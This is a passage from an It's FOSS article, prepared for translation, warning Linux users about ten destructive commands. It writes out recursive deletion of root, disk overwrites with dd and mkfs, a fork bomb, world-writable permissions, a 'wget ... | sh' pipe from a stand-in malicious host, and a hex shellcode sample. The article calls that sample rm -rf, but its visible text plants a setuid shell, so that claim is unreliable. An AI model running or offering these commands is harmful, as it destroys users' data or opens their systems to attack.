[#]: subject: "10 Destructive Linux Commands You Should Never Run"
[#]: via: "https://itsfoss.com/dangerous-linux-commands/"
[#]: author: "Abhishek Prakash https://itsfoss.com/"
[#]: collector: "lkxed"
[#]: translator: " "
[#]: reviewer: " "
[#]: publisher: " "
[#]: url: " "

10 Destructive Linux Commands You Should Never Run
======
What are the most dangerous Linux commands?

I have been asked this question numerous times and I have avoided answering that because **there is no definite list of dangerous Linux commands**.

You have the tools that enable you to control and modify every aspect of your operating system. I am not trying to scare you but if you are unfamiliar with the commands and tools, you can screw up your system pretty easily.

Imagine the scenario of a young child in a household. There are numerous ways the kid can hurt herself. But does this mean the child should not be allowed outside the crib? That would be damaging to her growth.

This is where parents set boundaries and guide the child. Don’t go near the fire. Don’t poke your fingers in the power outlets. As the child grows and gains experience, she can turn the stove on, make a fire in the fireplace and plug in the power cables.

Similarly, if you are aware of a few known risky commands, you may avoid falling into the traps of trolls trying to trick you into running commands and messing up your system.

As you gain experience and know the meaning and usages of the commands and tools, less will be the chances of destroying your system with silly and tricky commands.

My teammate Sreenath gathered some of the popular dangerous Linux commands. Let’s see how they work.

### 1. rm -rf /*

This one probably is the most infamous command circling in all kinds of social media. You’ll often find trolls commenting this in various discussions.

The command `rm` is used to remove files/directories. The flags `-r` and `-f` are used to denote recursive removal of all files inside the specified directory. Now, without root privilege, this command won’t do any harm.

Running the [command sudo rm -rf /][1] also will not create any issues as most distributions provide a failsafe option. You need to specify –no-preserver-root with it to actually run it.

```
sudo rm -rf / --no-preserve-root
```

However, a simpler version of this could be:

```
sudo rm -rf /*
```

It will start deleting all the files recursively in the root directory, and at some particular time, your system freezes with a message “Error deleting file.” Once rebooted, you will be sent to the **grub-rescue** prompt.

![Youtube Video][2]

### 2. Overwrite your partition

If you are familiar with file systems, you probably know what /dev/sda is. It is (usually) your disk drive partition. The `>` operator is used to write the output of its preceding command to the specified location provided.

Once you run any command and write it to /dev/sda, say:

```
echo "Hello" > /dev/sda
```

This will replace your partition containing all data needed to boot the system with the string “Hello”.

### 3. Move everything into the void

There is a void inside every Linux system. And that void is /dev/null.

Whatever you throw into this area is lost forever. Also, it reports the writing process as a success after discarding the data, which is the main reason for its destructiveness

```
mv /home/user/* /dev/null
```

The [mv command][3] is used to move or rename files/directories. In the above command, you move all the files inside the home directory to the void. While the root system is not destroyed, all your personal data will be lost.

### 4. Format your hard drive

[mkfs][4] is a command-line utility, used to format disks and partitions. It is a super handy tool for creating partitions for various installations. But the same command can format your drive also. Formatting your drive means deleting all the files needed for the system to boot.

```
mkfs.ext3 /dev/sda
```

The command does its job and you end up with a messed up system beyond recovery.

### 5. Fork bomb

This cute-looking, random combination of special characters and symbols is powerful enough to freeze a running system by exhausting the system resources.

```
:(){:|:&};:
```

& – Shell Background Operator. It informs the shell to put the command in the background. Here, it defines a function called ‘:‘, which calls itself twice, once in the foreground and once in the background. This process keeps on executing again and again till the system freezes.

As the name suggests, it forks itself and eventually becomes a chain bomb and eats up all the system resources. You’ll be forced to reboot the system, which is not as bad as the other commands in this list.

### 6. Overwrite important configuration files

While this is not a command by itself, it is more of a precautionary thing.

As mentioned above, the “>” operator is used to write to a file. It just discards anything already present in the file and writes new data provided to it.

```
command > config_filename
```

Now, if you use some important configuration file as the place to write data, it will replace the content, leaving a broken system.

### 7. Replace partition with garbage data

The /dev/random is one command in Linux that can create garbage data. Combine it with the [dd command][5] and your partition, and you get a Molotov to set your partition on fire.

```
dd if=/dev/random of=/dev/sda
```

dd command is used as a low-level copying tool. Here, it takes random data from `/dev/random` and replaces the partition `/dev/sda` with this garbage.

A similar kind of effect is obtained with:

```
cat /dev/urandom > filename
```

Here, it takes garbage data from /dev/urandom and fills in a file. If not terminated with Ctrl + C, the file can occupy a considerable amount of space, which may be disastrous for low-end systems.

### 8. Expose your system to everyone

Everything is a file in Linux and every [file has certain permissions][6].

You can view the permissions with `ls -l`. The root file system is not accessible to other users without privileges. While this ensures a private and secure system, you can upside down this system with one single command.

```
chmod -R 777/
```

The above command exposes all files on the root partition to everyone. What it means is that everyone using the system has read, write, and execution permission. This is not good for your system.

### 9. Download and run malicious content

How do you install software in Linux? You use the official package manager or ready to use packages as Deb/RPM, Snap. Flatpak etc.

However, some software are not packaged and their developers provide shell scripts to download and run. Take [homebrew][7] for example.

You download a shell file and run it as root to install a software in your system. Do you see the problem with it?

While it works with official software like Homebrew, you should double check the content of the shell script you are downloading before running it directly like this:

```
wget http://malicious_source -O- | sh
```

Such commands will download and run malicious scripts in your system, which can undermine the security of your system.

### 10. Disguised commands

There are many ways you can run commands in a Linux terminal. One such way is the hex-coded commands.

```
char esp[] __attribute__ ((section(“.text”))) /* e.s.p
release */
= “\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68”
“\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99”
“\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7”
“\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56”
“\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31”
“\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69”
“\x6e\x2f\x73\x68\x00\x2d\x63\x00”
“cp -p /bin/sh /tmp/.beyond; chmod 4755
/tmp/.beyond;”;
```

While it looks fancy, this is a coded version of `rm -rf` command. It does the same effect as running the previous command. So, while copying and pasting such fancy commands from the internet, be cautious.

### Wrapping Up

![pebkac][8]

There is a famous computing term PEBKAC; “problem exists between keyboard and chair.”

Because in the end, it’s up to the user (you) to ensure that you don’t destroy the system by blindly running any dangerous command.

> It is not UNIX’s job to stop you from shooting your foot. If you so choose to do so, then it is UNIX’s job to deliver Mr. Bullet to Mr Foot in the most efficient way it knows.

And that line equally applies to Linux. You get full control over your operating system. What you choose to do with is totally up to you.

I advise these things to ensure a safer experience:

* Try and understand the commands you are about to run.
* Keep a backup of your system settings with Timeshift
* Keep a backup of personal data (home directory) using DejaDup

As I said, there is no fixed list of dangerous Linux commands. A lot more can be added to this list and there is simply no end to it.

I hope this gives you some hints about what you should not be doing to stay safe with Linux. Let me know if you have suggestions in the comment section.

--------------------------------------------------------------------------------

via: https://itsfoss.com/dangerous-linux-commands/

作者：[Abhishek Prakash][a]
选题：[lkxed][b]
译者：[译者ID](https://github.com/译者ID)
校对：[校对者ID](https://github.com/校对者ID)

本文由 [LCTT](https://github.com/LCTT/TranslateProject) 原创编译，[Linux中国](https://linux.cn/) 荣誉推出

[a]: https://itsfoss.com/
[b]: https://github.com/lkxed
[1]: https://itsfoss.com/sudo-rm-rf/
[2]: https://youtu.be/AiKPo14uVNU
[3]: https://linuxhandbook.com/mv-command/
[4]: https://linuxhandbook.com/mkfs-command/
[5]: https://linuxhandbook.com/dd-command/
[6]: https://linuxhandbook.com/linux-file-permissions/
[7]: https://itsfoss.com/homebrew-linux/
[8]: https://itsfoss.com/wp-content/uploads/2022/09/pebkac.jpg
